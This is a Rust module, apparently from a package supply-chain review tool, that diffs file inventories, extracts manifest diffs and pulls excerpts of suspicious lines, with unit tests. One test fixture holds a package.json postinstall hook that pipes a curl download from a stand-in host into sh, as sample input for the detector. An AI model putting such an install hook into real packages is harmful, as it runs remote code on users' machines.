use std::collections::BTreeMap;
use std::error::Error;
use std::fmt;
use std::fs;
use std::io;
use std::path::{Path, PathBuf};

use similar::TextDiff;

use crate::inventory::{FileEntry, InventorySummary};
use crate::registry::Ecosystem;

const DEFAULT_EXCERPT_CONTEXT_LINES: usize = 2;
const DEFAULT_EXCERPT_MAX_LINES: usize = 8;
const DEFAULT_EXCERPT_MAX_BYTES: usize = 64 * 1024;

#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct DiffSummary {
    pub files_added: usize,
    pub files_removed: usize,
    pub files_changed: usize,
    pub changed_paths: Vec<String>,
    pub added_paths: Vec<String>,
    pub removed_paths: Vec<String>,
    pub modified_paths: Vec<String>,
}

impl DiffSummary {
    pub fn between(old: &InventorySummary, new: &InventorySummary) -> Self {
        let old_entries = inventory_index(old);
        let new_entries = inventory_index(new);

        let mut summary = Self::default();

        for (path, old_entry) in &old_entries {
            match new_entries.get(path) {
                None => summary.removed_paths.push(path_to_string(path)),
                Some(new_entry) if entries_differ(old_entry, new_entry) => {
                    summary.modified_paths.push(path_to_string(path));
                }
                Some(_) => {}
            }
        }

        for path in new_entries.keys() {
            if !old_entries.contains_key(path) {
                summary.added_paths.push(path_to_string(path));
            }
        }

        summary.files_added = summary.added_paths.len();
        summary.files_removed = summary.removed_paths.len();
        summary.files_changed = summary.modified_paths.len();
        summary.changed_paths = summary
            .added_paths
            .iter()
            .chain(&summary.removed_paths)
            .chain(&summary.modified_paths)
            .cloned()
            .collect();

        summary
    }

    pub fn has_changes(&self) -> bool {
        self.files_added > 0 || self.files_removed > 0 || self.files_changed > 0
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ManifestDiff {
    pub paths: Vec<String>,
    pub diff: String,
}

impl ManifestDiff {
    pub fn extract(
        ecosystem: Ecosystem,
        old_root: impl AsRef<Path>,
        new_root: impl AsRef<Path>,
        summary: &DiffSummary,
    ) -> Result<Option<Self>, DiffError> {
        let old_root = old_root.as_ref();
        let new_root = new_root.as_ref();
        let mut manifest_paths = summary
            .changed_paths
            .iter()
            .filter(|path| is_manifest_path(ecosystem, path))
            .cloned()
            .collect::<Vec<_>>();
        manifest_paths.sort();
        manifest_paths.dedup();

        if manifest_paths.is_empty() {
            return Ok(None);
        }

        let mut sections = Vec::new();

        for manifest_path in &manifest_paths {
            let old_content = read_optional_text(old_root.join(manifest_path))?;
            let new_content = read_optional_text(new_root.join(manifest_path))?;
            let old_label = format!("old/{manifest_path}");
            let new_label = format!("new/{manifest_path}");
            let section = TextDiff::from_lines(&old_content, &new_content)
                .unified_diff()
                .context_radius(3)
                .header(&old_label, &new_label)
                .to_string();
            sections.push(section);
        }

        Ok(Some(Self {
            paths: manifest_paths,
            diff: sections.join("\n"),
        }))
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SuspiciousExcerpt {
    pub path: String,
    pub reason: String,
    pub excerpt: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SuspiciousExcerptRequest {
    pub path: String,
    pub reason: String,
    pub needles: Vec<String>,
}

impl SuspiciousExcerpt {
    pub fn extract_many(
        root: impl AsRef<Path>,
        requests: &[SuspiciousExcerptRequest],
    ) -> Result<Vec<Self>, DiffError> {
        let root = root.as_ref();
        let mut excerpts = Vec::new();

        for request in requests {
            if let Some(excerpt) = Self::extract(root, request)? {
                excerpts.push(excerpt);
            }
        }

        Ok(excerpts)
    }

    pub fn extract(
        root: impl AsRef<Path>,
        request: &SuspiciousExcerptRequest,
    ) -> Result<Option<Self>, DiffError> {
        let path = root.as_ref().join(&request.path);
        let text = match read_optional_text_with_limit(path)? {
            Some(text) => text,
            None => return Ok(None),
        };

        let excerpt = excerpt_from_text(
            &text,
            &request.needles,
            DEFAULT_EXCERPT_CONTEXT_LINES,
            DEFAULT_EXCERPT_MAX_LINES,
        );

        Ok(excerpt.map(|excerpt| Self {
            path: request.path.clone(),
            reason: request.reason.clone(),
            excerpt,
        }))
    }
}

#[derive(Debug)]
pub enum DiffError {
    Io { path: PathBuf, source: io::Error },
}

impl fmt::Display for DiffError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Io { path, source } => {
                write!(f, "failed to read diff input {}: {source}", path.display())
            }
        }
    }
}

impl Error for DiffError {
    fn source(&self) -> Option<&(dyn Error + 'static)> {
        match self {
            Self::Io { source, .. } => Some(source),
        }
    }
}

fn inventory_index(inventory: &InventorySummary) -> BTreeMap<PathBuf, &FileEntry> {
    inventory
        .entries
        .iter()
        .map(|entry| (entry.path.clone(), entry))
        .collect()
}

fn entries_differ(old: &FileEntry, new: &FileEntry) -> bool {
    old.file_type != new.file_type
        || old.size != new.size
        || old.mode != new.mode
        || old.digest != new.digest
}

fn path_to_string(path: &Path) -> String {
    path.to_string_lossy().into_owned()
}

fn read_optional_text(path: PathBuf) -> Result<String, DiffError> {
    match fs::read(&path) {
        Ok(bytes) => Ok(String::from_utf8_lossy(&bytes).into_owned()),
        Err(source) if source.kind() == io::ErrorKind::NotFound => Ok(String::new()),
        Err(source) => Err(DiffError::Io { path, source }),
    }
}

fn read_optional_text_with_limit(path: PathBuf) -> Result<Option<String>, DiffError> {
    match fs::read(&path) {
        Ok(bytes) => {
            let bytes = if bytes.len() > DEFAULT_EXCERPT_MAX_BYTES {
                &bytes[..DEFAULT_EXCERPT_MAX_BYTES]
            } else {
                &bytes[..]
            };
            Ok(Some(String::from_utf8_lossy(bytes).into_owned()))
        }
        Err(source) if source.kind() == io::ErrorKind::NotFound => Ok(None),
        Err(source) => Err(DiffError::Io { path, source }),
    }
}

fn excerpt_from_text(
    text: &str,
    needles: &[String],
    context_lines: usize,
    max_lines: usize,
) -> Option<String> {
    let lines = text.lines().collect::<Vec<_>>();
    if lines.is_empty() {
        return None;
    }

    let match_index = if needles.is_empty() {
        Some(0)
    } else {
        let lowered_needles = needles
            .iter()
            .map(|needle| needle.to_lowercase())
            .collect::<Vec<_>>();
        lines.iter().position(|line| {
            let lowered_line = line.to_lowercase();
            lowered_needles
                .iter()
                .any(|needle| lowered_line.contains(needle))
        })
    }?;

    let start = match_index.saturating_sub(context_lines);
    let mut end = usize::min(lines.len(), match_index + context_lines + 1);
    if end - start > max_lines {
        end = start + max_lines;
    }

    Some(
        lines[start..end]
            .iter()
            .enumerate()
            .map(|(offset, line)| format!("{:>4}: {}", start + offset + 1, line))
            .collect::<Vec<_>>()
            .join("\n"),
    )
}

fn is_manifest_path(ecosystem: Ecosystem, path: &str) -> bool {
    let file_name = Path::new(path)
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default();

    match ecosystem {
        Ecosystem::Npm => matches!(
            file_name,
            "package.json"
                | "package-lock.json"
                | "npm-shrinkwrap.json"
                | "pnpm-lock.yaml"
                | "yarn.lock"
        ),
        Ecosystem::Rubygems => {
            matches!(file_name, "Gemfile" | "Gemfile.lock") || file_name.ends_with(".gemspec")
        }
        Ecosystem::Pypi => {
            matches!(
                file_name,
                "pyproject.toml"
                    | "setup.py"
                    | "setup.cfg"
                    | "Pipfile"
                    | "Pipfile.lock"
                    | "poetry.lock"
                    | "pdm.lock"
            ) || (file_name.starts_with("requirements") && file_name.ends_with(".txt"))
        }
        Ecosystem::Crates => matches!(file_name, "Cargo.toml" | "Cargo.lock"),
    }
}

#[cfg(test)]
mod tests {
    use std::fs;
    use std::path::{Path, PathBuf};
    use std::time::{SystemTime, UNIX_EPOCH};

    use crate::inventory::{FileEntry, FileType, InventorySummary};
    use crate::registry::Ecosystem;

    use super::{DiffSummary, ManifestDiff, SuspiciousExcerpt, SuspiciousExcerptRequest};

    #[test]
    fn summarizes_added_removed_and_modified_paths() {
        let old = InventorySummary {
            entries: vec![
                entry(
                    "README.md",
                    FileType::File,
                    10,
                    0o100644,
                    Some("old-readme"),
                ),
                entry("removed.txt", FileType::File, 4, 0o100644, Some("gone")),
                entry("same-dir", FileType::Directory, 0, 0o040755, None),
            ],
        };
        let new = InventorySummary {
            entries: vec![
                entry(
                    "README.md",
                    FileType::File,
                    12,
                    0o100644,
                    Some("new-readme"),
                ),
                entry("added.txt", FileType::File, 7, 0o100644, Some("fresh")),
                entry("same-dir", FileType::Directory, 0, 0o040755, None),
            ],
        };

        let summary = DiffSummary::between(&old, &new);

        assert!(summary.has_changes());
        assert_eq!(summary.files_added, 1);
        assert_eq!(summary.files_removed, 1);
        assert_eq!(summary.files_changed, 1);
        assert_eq!(summary.added_paths, vec!["added.txt"]);
        assert_eq!(summary.removed_paths, vec!["removed.txt"]);
        assert_eq!(summary.modified_paths, vec!["README.md"]);
        assert_eq!(
            summary.changed_paths,
            vec!["added.txt", "removed.txt", "README.md"]
        );
    }

    #[test]
    fn treats_type_or_mode_changes_as_modifications() {
        let old = InventorySummary {
            entries: vec![entry("bin/tool", FileType::File, 9, 0o100644, Some("same"))],
        };
        let new = InventorySummary {
            entries: vec![entry("bin/tool", FileType::Symlink, 0, 0o120777, None)],
        };

        let summary = DiffSummary::between(&old, &new);

        assert_eq!(summary.files_changed, 1);
        assert_eq!(summary.modified_paths, vec!["bin/tool"]);
        assert!(summary.added_paths.is_empty());
        assert!(summary.removed_paths.is_empty());
    }

    #[test]
    fn reports_no_changes_for_identical_inventory() {
        let inventory = InventorySummary {
            entries: vec![
                entry("README.md", FileType::File, 10, 0o100644, Some("same")),
                entry("src", FileType::Directory, 0, 0o040755, None),
            ],
        };

        let summary = DiffSummary::between(&inventory, &inventory);

        assert!(!summary.has_changes());
        assert_eq!(summary.files_added, 0);
        assert_eq!(summary.files_removed, 0);
        assert_eq!(summary.files_changed, 0);
        assert!(summary.changed_paths.is_empty());
    }

    #[test]
    fn extracts_manifest_diff_for_changed_manifest_files() {
        let old_root = TestDir::new("manifest-old");
        let new_root = TestDir::new("manifest-new");
        fs::create_dir_all(old_root.path().join("pkg")).expect("old pkg dir should exist");
        fs::create_dir_all(new_root.path().join("pkg")).expect("new pkg dir should exist");
        fs::write(
            old_root.path().join("pkg/package.json"),
            "{\n  \"name\": \"demo\",\n  \"version\": \"1.0.0\"\n}\n",
        )
        .expect("old manifest should be written");
        fs::write(
            new_root.path().join("pkg/package.json"),
            "{\n  \"name\": \"demo\",\n  \"version\": \"1.1.0\"\n}\n",
        )
        .expect("new manifest should be written");
        fs::write(old_root.path().join("pkg/src.js"), "console.log('old')\n")
            .expect("old source should be written");
        fs::write(new_root.path().join("pkg/src.js"), "console.log('new')\n")
            .expect("new source should be written");

        let summary = DiffSummary {
            files_changed: 2,
            changed_paths: vec!["pkg/src.js".to_string(), "pkg/package.json".to_string()],
            modified_paths: vec!["pkg/src.js".to_string(), "pkg/package.json".to_string()],
            ..DiffSummary::default()
        };

        let manifest_diff =
            ManifestDiff::extract(Ecosystem::Npm, old_root.path(), new_root.path(), &summary)
                .expect("manifest diff should load")
                .expect("manifest diff should exist");

        assert_eq!(manifest_diff.paths, vec!["pkg/package.json"]);
        assert!(manifest_diff.diff.contains("--- old/pkg/package.json"));
        assert!(manifest_diff.diff.contains("+++ new/pkg/package.json"));
        assert!(manifest_diff.diff.contains("-  \"version\": \"1.0.0\""));
        assert!(manifest_diff.diff.contains("+  \"version\": \"1.1.0\""));
        assert!(!manifest_diff.diff.contains("src.js"));
    }

    #[test]
    fn extracts_added_and_removed_manifest_files() {
        let old_root = TestDir::new("manifest-added-old");
        let new_root = TestDir::new("manifest-added-new");
        fs::write(
            new_root.path().join("Cargo.toml"),
            "[package]\nname = \"demo\"\nversion = \"0.1.0\"\n",
        )
        .expect("new manifest should be written");

        let added_summary = DiffSummary {
            files_added: 1,
            changed_paths: vec!["Cargo.toml".to_string()],
            added_paths: vec!["Cargo.toml".to_string()],
            ..DiffSummary::default()
        };
        let added = ManifestDiff::extract(
            Ecosystem::Crates,
            old_root.path(),
            new_root.path(),
            &added_summary,
        )
        .expect("added manifest diff should load")
        .expect("added manifest diff should exist");
        assert!(added.diff.contains("+++ new/Cargo.toml"));
        assert!(added.diff.contains("+[package]"));

        fs::write(old_root.path().join("Cargo.lock"), "version = 3\n")
            .expect("old lockfile should be written");
        let removed_summary = DiffSummary {
            files_removed: 1,
            changed_paths: vec!["Cargo.lock".to_string()],
            removed_paths: vec!["Cargo.lock".to_string()],
            ..DiffSummary::default()
        };
        let removed = ManifestDiff::extract(
            Ecosystem::Crates,
            old_root.path(),
            new_root.path(),
            &removed_summary,
        )
        .expect("removed manifest diff should load")
        .expect("removed manifest diff should exist");
        assert!(removed.diff.contains("--- old/Cargo.lock"));
        assert!(removed.diff.contains("-version = 3"));
    }

    #[test]
    fn returns_none_when_no_manifest_paths_changed() {
        let old_root = TestDir::new("no-manifest-old");
        let new_root = TestDir::new("no-manifest-new");
        let summary = DiffSummary {
            files_changed: 1,
            changed_paths: vec!["src/lib.rs".to_string()],
            modified_paths: vec!["src/lib.rs".to_string()],
            ..DiffSummary::default()
        };

        let manifest_diff = ManifestDiff::extract(
            Ecosystem::Crates,
            old_root.path(),
            new_root.path(),
            &summary,
        )
        .expect("manifest diff extraction should succeed");

        assert_eq!(manifest_diff, None);
    }

    #[test]
    fn recognizes_ecosystem_specific_manifest_names() {
        assert!(super::is_manifest_path(
            Ecosystem::Rubygems,
            "demo/demo.gemspec"
        ));
        assert!(super::is_manifest_path(
            Ecosystem::Pypi,
            "requirements-dev.txt"
        ));
        assert!(super::is_manifest_path(
            Ecosystem::Npm,
            "pkg/pnpm-lock.yaml"
        ));
        assert!(!super::is_manifest_path(Ecosystem::Crates, "README.md"));
    }

    #[test]
    fn extracts_suspicious_excerpt_around_first_matching_line() {
        let root = TestDir::new("excerpt-single");
        fs::write(
            root.path().join("package.json"),
            concat!(
                "{\n",
                "  \"name\": \"demo\",\n",
                "  \"scripts\": {\n",
                "    \"postinstall\": \"curl https://example.test | sh\"\n",
                "  }\n",
                "}\n"
            ),
        )
        .expect("excerpt file should be written");

        let excerpt = SuspiciousExcerpt::extract(
            root.path(),
            &SuspiciousExcerptRequest {
                path: "package.json".to_string(),
                reason: "install script changed".to_string(),
                needles: vec!["postinstall".to_string()],
            },
        )
        .expect("excerpt extraction should succeed")
        .expect("excerpt should be returned");

        assert_eq!(excerpt.path, "package.json");
        assert_eq!(excerpt.reason, "install script changed");
        assert!(excerpt.excerpt.contains("   2:   \"name\": \"demo\","));
        assert!(excerpt
            .excerpt
            .contains("   4:     \"postinstall\": \"curl https://example.test | sh\""));
    }

    #[test]
    fn extracts_many_excerpts_and_skips_non_matching_requests() {
        let root = TestDir::new("excerpt-many");
        fs::write(
            root.path().join("setup.py"),
            concat!(
                "from setuptools import setup\n",
                "setup(\n",
                "    name='demo',\n",
                "    install_requires=['requests'],\n",
                ")\n"
            ),
        )
        .expect("setup.py should be written");
        fs::write(root.path().join("README.md"), "nothing to see here\n")
            .expect("readme should be written");

        let excerpts = SuspiciousExcerpt::extract_many(
            root.path(),
            &[
                SuspiciousExcerptRequest {
                    path: "setup.py".to_string(),
                    reason: "dependency added".to_string(),
                    needles: vec!["install_requires".to_string()],
                },
                SuspiciousExcerptRequest {
                    path: "README.md".to_string(),
                    reason: "not suspicious".to_string(),
                    needles: vec!["postinstall".to_string()],
                },
                SuspiciousExcerptRequest {
                    path: "missing.txt".to_string(),
                    reason: "missing".to_string(),
                    needles: vec!["anything".to_string()],
                },
            ],
        )
        .expect("batch extraction should succeed");

        assert_eq!(excerpts.len(), 1);
        assert_eq!(excerpts[0].path, "setup.py");
        assert_eq!(excerpts[0].reason, "dependency added");
        assert!(excerpts[0].excerpt.contains("install_requires"));
    }

    #[test]
    fn falls_back_to_first_lines_when_no_needles_are_provided() {
        let root = TestDir::new("excerpt-fallback");
        fs::write(
            root.path().join("pyproject.toml"),
            concat!(
                "[project]\n",
                "name = \"demo\"\n",
                "version = \"1.0.0\"\n",
                "dependencies = [\"requests\"]\n"
            ),
        )
        .expect("pyproject should be written");

        let excerpt = SuspiciousExcerpt::extract(
            root.path(),
            &SuspiciousExcerptRequest {
                path: "pyproject.toml".to_string(),
                reason: "manifest changed".to_string(),
                needles: Vec::new(),
            },
        )
        .expect("fallback extraction should succeed")
        .expect("fallback excerpt should be returned");

        assert!(excerpt.excerpt.contains("   1: [project]"));
        assert!(excerpt.excerpt.contains("   2: name = \"demo\""));
    }

    fn entry(
        path: &str,
        file_type: FileType,
        size: u64,
        mode: u32,
        digest: Option<&str>,
    ) -> FileEntry {
        FileEntry {
            path: PathBuf::from(path),
            file_type,
            size,
            mode,
            digest: digest.map(str::to_string),
        }
    }

    struct TestDir {
        path: PathBuf,
    }

    impl TestDir {
        fn new(label: &str) -> Self {
            let unique = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .expect("time should move forward")
                .as_nanos();
            let path = std::env::temp_dir().join(format!("pincushion-diff-{label}-{unique}"));
            fs::create_dir_all(&path).expect("temp dir should be created");
            Self { path }
        }

        fn path(&self) -> &Path {
            &self.path
        }
    }

    impl Drop for TestDir {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.path);
        }
    }
}
